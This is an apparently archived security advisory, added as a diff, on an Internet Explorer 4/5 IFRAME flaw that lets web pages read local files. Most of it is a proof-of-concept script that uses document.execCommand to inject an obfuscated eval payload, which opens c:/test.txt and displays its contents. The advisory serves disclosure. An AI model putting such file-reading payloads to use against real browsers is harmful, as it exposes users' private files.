@@ -1,0 +1,17 @@
+Microsoft Internet Explorer 5.0 for Windows 2000/Windows 95/Windows 98/Windows NT 4,Internet Explorer 4.0.1 for Windows 98/Windows NT 4.0/Unix 5.0 IFRAME Vulnerability
+
+source: http://www.securityfocus.com/bid/696/info
+
+Internet Explorer 5 will allow a malicious web page to read the contents of local files through a weakness in the IE5 security model. Normally the document.execCommand method is restricted from reading and returning data on the local machine, however if the method is called from within an IFRAME this restriction can be circumvented.
+
+<SCRIPT>
+alert("Create text file c:\\test.txt and it will be read");
+function f()
+{
+I1.focus();
+document.execCommand("selectAll");
+document.execCommand("InsertParagraph",false,">\"STYLE='left:expression(eval(String.fromCharCode(97,61,119,105,110,100,111,119,46,111,112,101,110,40,39,102,105,108,101,58,47,47,99,58,47,116,101,115,116,46,116,120,116,39,41,59,97,108,101,114,116,40,97,46,100,111,99,117,109,101,110,116,46,98,111,100,121,46,105,110,110,101,114,84,101,120,116,41)));'");
+}
+setTimeout('f()',2000);
+</SCRIPT>
+<IFRAME ID="I1" SRC="file://c:/test.txt"></IFRAME> 
